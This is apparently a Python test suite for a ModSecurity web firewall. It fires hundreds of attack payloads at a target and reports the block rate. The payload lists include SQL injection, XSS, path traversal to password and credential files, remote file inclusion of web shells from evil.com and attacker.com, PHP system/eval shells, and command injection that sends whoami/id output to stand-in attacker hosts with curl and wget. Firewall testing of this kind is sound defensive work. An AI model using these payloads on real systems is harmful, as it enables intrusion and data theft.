#!/usr/bin/env python3
"""
Comprehensive ModSecurity Test Suite
This script runs extensive tests against a ModSecurity-protected endpoint
"""

import requests
import json
import time
import sys
import argparse
from urllib.parse import quote
import concurrent.futures
import threading

class ModSecurityComprehensiveTester:
    def __init__(self, target_url, timeout=10, max_workers=5):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.max_workers = max_workers
        self.session = requests.Session()
        self.results = {
            'blocked': [],
            'allowed': [],
            'errors': []
        }
        self.lock = threading.Lock()
        
    def test_payload(self, test_info):
        """Test a single payload against ModSecurity"""
        test_name, method, path, headers, data, params = test_info
        url = f"{self.target_url}{path}"
        
        default_headers = {
            'User-Agent': 'ModSecurity-Test-Suite/1.0',
            'Accept': '*/*'
        }
        
        if headers:
            default_headers.update(headers)
            
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, headers=default_headers, 
                                          timeout=self.timeout, allow_redirects=False)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=default_headers,
                                           timeout=self.timeout, allow_redirects=False)
            elif method.upper() == 'PUT':
                response = self.session.put(url, data=data, headers=default_headers,
                                          timeout=self.timeout, allow_redirects=False)
            
            with self.lock:
                # ModSecurity typically blocks with 403 or 406 status codes
                if response.status_code in [403, 406, 501, 502, 503]:
                    self.results['blocked'].append({
                        'test': test_name,
                        'status': response.status_code,
                        'method': method,
                        'blocked': True
                    })
                    print(f"✅ BLOCKED: {test_name} (HTTP {response.status_code})")
                    return True
                else:
                    self.results['allowed'].append({
                        'test': test_name,
                        'status': response.status_code,
                        'method': method,
                        'blocked': False
                    })
                    print(f"⚠️  ALLOWED: {test_name} (HTTP {response.status_code})")
                    return False
                    
        except requests.RequestException as e:
            with self.lock:
                self.results['errors'].append({
                    'test': test_name,
                    'error': str(e),
                    'method': method
                })
                print(f"❌ ERROR: {test_name} - {str(e)}")
                return None
    
    def get_sql_injection_tests(self):
        """Generate SQL Injection test cases"""
        sql_payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            
            # Union-based SQL injection
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT user(),version(),database()--",
            
            # Boolean-based blind SQL injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Time-based blind SQL injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--",
            
            # Error-based SQL injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Second-order SQL injection
            "admin'; DROP TABLE users;--",
            "'; INSERT INTO users VALUES ('hacker','password');--",
            
            # NoSQL injection
            "'; db.users.find();//",
            "'; db.users.drop();//",
            
            # MSSQL specific
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC sp_configure 'show advanced options', 1--"
        ]
        
        tests = []
        for payload in sql_payloads:
            # Test in URL parameters
            tests.append((f"SQL Injection (GET param): {payload[:30]}...", 'GET', '/', None, None, {'id': payload}))
            tests.append((f"SQL Injection (GET param user): {payload[:30]}...", 'GET', '/', None, None, {'user': payload}))
            
            # Test in POST data
            tests.append((f"SQL Injection (POST data): {payload[:30]}...", 'POST', '/login', None, {'username': payload, 'password': 'test'}, None))
            tests.append((f"SQL Injection (POST search): {payload[:30]}...", 'POST', '/', None, {'search': payload}, None))
        
        return tests
    
    def get_xss_tests(self):
        """Generate XSS test cases"""
        xss_payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            
            # Event handler XSS
            "<input type='text' onmouseover='alert(1)'>",
            "<body onload=alert('XSS')>",
            "<div onclick='alert(1)'>Click me</div>",
            "<button onmouseover='alert(1)'>Hover me</button>",
            
            # JavaScript URI
            "javascript:alert('XSS')",
            "javascript:void(0)",
            "javascript:confirm('XSS')",
            
            # Encoded XSS
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            
            # Filter bypass attempts
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
            
            # DOM-based XSS vectors
            "<object data='javascript:alert(\"XSS\")'></object>",
            "<embed src='javascript:alert(\"XSS\")'></embed>",
            "<applet code='javascript:alert(\"XSS\")'></applet>",
            
            # Advanced XSS
            "<svg><animate onbegin=alert('XSS')>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<details open ontoggle=alert('XSS')>"
        ]
        
        tests = []
        for payload in xss_payloads:
            # Test in URL parameters
            tests.append((f"XSS (GET param): {payload[:30]}...", 'GET', '/', None, None, {'q': payload}))
            tests.append((f"XSS (GET search): {payload[:30]}...", 'GET', '/search', None, None, {'q': payload}))
            
            # Test in POST data
            tests.append((f"XSS (POST data): {payload[:30]}...", 'POST', '/', None, {'comment': payload}, None))
            tests.append((f"XSS (POST message): {payload[:30]}...", 'POST', '/', None, {'message': payload}, None))
        
        return tests
    
    def get_lfi_tests(self):
        """Generate Local File Inclusion test cases"""
        lfi_payloads = [
            # Basic LFI
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            
            # Null byte injection (historical)
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.txt",
            
            # URL encoding
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73%5c%73%79%73%74%65%6d%33%32%5c%64%72%69%76%65%72%73%5c%65%74%63%5c%68%6f%73%74%73",
            
            # Double encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%65%74%63%2f%70%61%73%73%77%64",
            
            # UTF-8 encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            
            # Filter bypass
            "....//....//....//etc/passwd",
            "..//////..////..//////etc/passwd",
            "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            
            # Proc filesystem
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "/proc/self/status",
            "/proc/self/fd/0",
            
            # Log files
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/var/log/messages",
            
            # Configuration files
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/mysql/my.cnf",
            "/etc/ssh/sshd_config"
        ]
        
        tests = []
        for payload in lfi_payloads:
            tests.append((f"LFI: {payload[:40]}...", 'GET', '/', None, None, {'file': payload}))
            tests.append((f"LFI (include): {payload[:40]}...", 'GET', '/', None, None, {'include': payload}))
            tests.append((f"LFI (page): {payload[:40]}...", 'GET', '/', None, None, {'page': payload}))
            tests.append((f"LFI (vulnerable endpoint): {payload[:40]}...", 'GET', f'/vulnerable/{payload}', None, None, None))
        
        return tests
    
    def get_rfi_tests(self):
        """Generate Remote File Inclusion test cases"""
        rfi_payloads = [
            # Basic RFI
            "http://evil.com/shell.php",
            "https://attacker.com/backdoor.txt",
            "http://malicious.site/webshell.php",
            
            # With query parameters
            "http://evil.com/shell.php?cmd=id",
            "https://attacker.com/backdoor.txt?action=exec",
            
            # Different protocols
            "ftp://evil.com/shell.php",
            "file://evil.com/malware.txt",
            
            # Data URIs
            "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
            "data:application/x-httpd-php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+",
            
            # PHP wrappers
            "php://input",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=config.php",
            "expect://whoami",
            "expect://id"
        ]
        
        tests = []
        for payload in rfi_payloads:
            tests.append((f"RFI: {payload[:40]}...", 'GET', '/', None, None, {'include': payload}))
            tests.append((f"RFI (file): {payload[:40]}...", 'GET', '/', None, None, {'file': payload}))
            tests.append((f"RFI (url): {payload[:40]}...", 'GET', '/', None, None, {'url': payload}))
        
        return tests
    
    def get_command_injection_tests(self):
        """Generate Command Injection test cases"""
        cmd_payloads = [
            # Basic command injection
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "|| id",
            "; id",
            
            # Windows commands
            "& dir",
            "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "| dir /s",
            
            # Backticks
            "`whoami`",
            "`cat /etc/passwd`",
            "`id`",
            "`uname -a`",
            
            # Command substitution
            "$(whoami)",
            "$(cat /etc/passwd)",
            "$(id)",
            "$(uname -a)",
            
            # Time-based detection
            "; sleep 10",
            "| ping -c 10 127.0.0.1",
            "&& timeout 10",
            
            # Blind command injection
            "; curl http://attacker.com/$(whoami)",
            "| wget http://evil.com/log?data=$(id)",
            
            # Shellshock
            "() { :; }; /bin/bash -c \"echo vulnerable\"",
            "() { _; } >_[$($())] { echo vulnerable; }"
        ]
        
        tests = []
        for payload in cmd_payloads:
            tests.append((f"Command Injection: {payload[:30]}...", 'GET', '/', None, None, {'cmd': payload}))
            tests.append((f"Command Injection (POST): {payload[:30]}...", 'POST', '/', None, {'command': payload}, None))
            tests.append((f"Command Injection (exec): {payload[:30]}...", 'GET', '/', None, None, {'exec': payload}))
        
        return tests
    
    def get_protocol_tests(self):
        """Generate Protocol attack test cases"""
        tests = [
            # Header injection
            ("Header Injection (CRLF)", 'GET', '/', {'X-Custom': 'test\r\nInjected: header'}, None, None),
            ("Header Injection (LF)", 'GET', '/', {'X-Custom': 'test\nInjected: header'}, None, None),
            
            # HTTP Request Smuggling
            ("HTTP Request Smuggling", 'POST', '/', {'Transfer-Encoding': 'chunked', 'Content-Length': '10'}, 'test', None),
            
            # Oversized headers
            ("Oversized Header", 'GET', '/', {'X-Large': 'A' * 8192}, None, None),
            ("Oversized User-Agent", 'GET', '/', {'User-Agent': 'B' * 4096}, None, None),
            
            # Invalid characters in headers
            ("Invalid Header Characters", 'GET', '/', {'X-Invalid': 'test\x00\x01\x02'}, None, None),
            ("Header with NULL bytes", 'GET', '/', {'X-Null': 'test\x00null'}, None, None),
            
            # Method override
            ("Method Override DELETE", 'POST', '/', {'X-HTTP-Method-Override': 'DELETE'}, None, None),
            ("Method Override PUT", 'POST', '/', {'X-HTTP-Method-Override': 'PUT'}, None, None),
            
            # Invalid Content-Type
            ("Invalid Content-Type", 'POST', '/', {'Content-Type': 'invalid/type'}, 'test', None),
            ("Multiple Content-Type", 'POST', '/', {'Content-Type': 'application/json\r\nContent-Type: text/xml'}, 'test', None),
        ]
        
        return tests
    
    def get_scanner_detection_tests(self):
        """Generate Scanner detection test cases"""
        scanner_agents = [
            "sqlmap/1.0",
            "Nessus",
            "OpenVAS",
            "Nikto",
            "w3af",
            "Burp Suite",
            "OWASP ZAP",
            "Acunetix",
            "Netsparker",
            "AppScan",
            "WebInspect",
            "Rapid7",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.2; MS-RTC LM 8)"
        ]
        
        tests = []
        for agent in scanner_agents:
            tests.append((f"Scanner UA: {agent[:40]}...", 'GET', '/', {'User-Agent': agent}, None, None))
        
        return tests
    
    def get_php_injection_tests(self):
        """Generate PHP injection test cases"""
        php_payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?php phpinfo(); ?>",
            "<?php eval($_POST['code']); ?>",
            "<?php file_get_contents('/etc/passwd'); ?>",
            "<?php exec('whoami'); ?>",
            "<?php shell_exec('id'); ?>",
            "<?php passthru('ls -la'); ?>",
            "<?php `whoami`; ?>",
            "<?=system('id')?>",
            "<?=`whoami`?>",
            "system('id')",
            "exec('whoami')",
            "shell_exec('id')",
            "passthru('ls')",
            "eval($_POST['code'])",
            "file_get_contents('/etc/passwd')"
        ]
        
        tests = []
        for payload in php_payloads:
            tests.append((f"PHP Injection: {payload[:30]}...", 'POST', '/', None, {'code': payload}, None))
            tests.append((f"PHP Injection (GET): {payload[:30]}...", 'GET', '/', None, None, {'code': payload}))
        
        return tests
    
    def run_all_tests(self):
        """Run all test suites using thread pool"""
        print(f"🚀 Starting Comprehensive ModSecurity Test Suite")
        print(f"🎯 Target: {self.target_url}")
        print(f"⚡ Workers: {self.max_workers}")
        print("=" * 80)
        
        # Collect all tests
        all_tests = []
        test_categories = [
            ("SQL Injection", self.get_sql_injection_tests),
            ("XSS", self.get_xss_tests),
            ("LFI", self.get_lfi_tests),
            ("RFI", self.get_rfi_tests),
            ("Command Injection", self.get_command_injection_tests),
            ("Protocol Attacks", self.get_protocol_tests),
            ("Scanner Detection", self.get_scanner_detection_tests),
            ("PHP Injection", self.get_php_injection_tests)
        ]
        
        for category_name, get_tests_func in test_categories:
            print(f"\n📋 Preparing {category_name} tests...")
            category_tests = get_tests_func()
            all_tests.extend(category_tests)
            print(f"   Added {len(category_tests)} tests")
        
        print(f"\n🔥 Total tests to run: {len(all_tests)}")
        print("=" * 80)
        
        # Run tests in parallel
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.test_payload, test) for test in all_tests]
            concurrent.futures.wait(futures)
        
        end_time = time.time()
        
        print("\n" + "=" * 80)
        print(f"⏱️  Tests completed in {end_time - start_time:.2f} seconds")
        
        self.print_results()
        return self.results
    
    def print_results(self):
        """Print comprehensive test results"""
        print("\n" + "=" * 80)
        print("📊 COMPREHENSIVE TEST RESULTS")
        print("=" * 80)
        
        total_tests = len(self.results['blocked']) + len(self.results['allowed']) + len(self.results['errors'])
        blocked_count = len(self.results['blocked'])
        allowed_count = len(self.results['allowed'])
        error_count = len(self.results['errors'])
        
        print(f"📈 Total Tests: {total_tests}")
        print(f"✅ Blocked (Protected): {blocked_count}")
        print(f"⚠️  Allowed (Potential Risk): {allowed_count}")
        print(f"❌ Errors: {error_count}")
        
        if total_tests > 0:
            protection_rate = (blocked_count / (blocked_count + allowed_count)) * 100 if (blocked_count + allowed_count) > 0 else 0
            print(f"🛡️  Protection Rate: {protection_rate:.1f}%")
        
        # Detailed analysis
        print(f"\n📋 Protection Analysis:")
        if protection_rate >= 90:
            print("🟢 EXCELLENT: Your ModSecurity setup is providing outstanding protection!")
            print("   Your WAF is blocking the vast majority of attack attempts.")
        elif protection_rate >= 80:
            print("🟢 VERY GOOD: Your ModSecurity setup is providing strong protection!")
            print("   Consider reviewing the allowed attacks for potential tuning.")
        elif protection_rate >= 60:
            print("🟡 GOOD: Your ModSecurity setup is providing decent protection.")
            print("   There's room for improvement - consider rule tuning or paranoia level adjustment.")
        elif protection_rate >= 40:
            print("🟠 NEEDS IMPROVEMENT: Your ModSecurity setup needs attention.")
            print("   Many attacks are getting through - review configuration and rules.")
        else:
            print("🔴 CRITICAL: Your ModSecurity setup is not providing adequate protection!")
            print("   Immediate attention required - check if ModSecurity is properly configured.")
        
        # Show sample blocked attacks
        if self.results['blocked']:
            print(f"\n✅ Sample Blocked Attacks ({min(10, len(self.results['blocked']))}):")
            for result in self.results['blocked'][:10]:
                print(f"   • {result['test']} (HTTP {result['status']})")
        
        # Show sample allowed attacks (concerning)
        if self.results['allowed']:
            print(f"\n⚠️  Sample Allowed Attacks ({min(10, len(self.results['allowed']))}):")
            for result in self.results['allowed'][:10]:
                print(f"   • {result['test']} (HTTP {result['status']})")
        
        # Show errors
        if self.results['errors']:
            print(f"\n❌ Errors ({min(5, len(self.results['errors']))}):")
            for result in self.results['errors'][:5]:
                print(f"   • {result['test']}: {result['error']}")
    
    def save_detailed_report(self, filename='comprehensive_modsecurity_test_report.json'):
        """Save detailed results to JSON file"""
        report = {
            'target_url': self.target_url,
            'timestamp': time.time(),
            'summary': {
                'total_tests': len(self.results['blocked']) + len(self.results['allowed']) + len(self.results['errors']),
                'blocked': len(self.results['blocked']),
                'allowed': len(self.results['allowed']),
                'errors': len(self.results['errors']),
                'protection_rate': (len(self.results['blocked']) / (len(self.results['blocked']) + len(self.results['allowed']))) * 100 if (len(self.results['blocked']) + len(self.results['allowed'])) > 0 else 0
            },
            'details': self.results
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n📄 Detailed report saved to: {filename}")

def main():
    parser = argparse.ArgumentParser(description='Comprehensive ModSecurity Test Suite')
    parser.add_argument('url', help='Target URL to test (e.g., http://localhost)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--workers', type=int, default=5, help='Number of concurrent workers (default: 5)')
    parser.add_argument('--output', type=str, default='comprehensive_test_report.json', help='Output file for detailed report')
    
    args = parser.parse_args()
    
    print("🔒 COMPREHENSIVE MODSECURITY TEST SUITE")
    print("=" * 80)
    print("⚠️  WARNING: This will send potentially malicious payloads to the target!")
    print("   Only run this against systems you own or have permission to test.")
    print("=" * 80)
    
    response = input("Do you want to continue? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Test cancelled.")
        return
    
    # Run the comprehensive tests
    tester = ModSecurityComprehensiveTester(args.url, timeout=args.timeout, max_workers=args.workers)
    results = tester.run_all_tests()
    tester.save_detailed_report(args.output)
    
    print(f"\n🎯 Testing complete! Check {args.output} for detailed results.")

if __name__ == "__main__":
    main() 